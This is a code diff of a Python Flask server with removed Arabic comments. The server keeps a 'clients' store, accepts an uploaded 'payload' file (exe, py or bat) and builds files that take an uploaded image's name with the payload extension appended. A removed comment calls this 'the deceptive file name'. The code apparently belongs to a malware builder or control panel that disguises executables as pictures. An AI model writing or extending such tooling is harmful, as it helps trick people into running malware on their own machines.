@@ -11,7 +11,7 @@ app = Flask(__name__)
 # تخزين في الذاكرة
 clients = {}
 UPLOADED_PAYLOAD_DATA = None
-PAYLOAD_EXTENSION = ".exe" # افتراضي
+PAYLOAD_EXTENSION = ".exe"
 lock = threading.Lock()
 
 @app.route('/')
@@ -27,7 +27,6 @@ def upload_payload():
     if file.filename == '':
         return jsonify({"ok": False, "error": "Empty filename"})
     
-    # حفظ الملف سواء كان exe أو py أو bat
     UPLOADED_PAYLOAD_DATA = file.read()
     PAYLOAD_EXTENSION = os.path.splitext(file.filename)[1]
     return jsonify({"ok": True})
@@ -44,7 +43,6 @@ def build():
     img = request.files['image']
     img_name = img.filename
     
-    # اسم الملف الخادع
     custom_name = request.form.get('custom_name', '').strip()
     if not custom_name:
         custom_name = f"{img_name}{PAYLOAD_EXTENSION}"
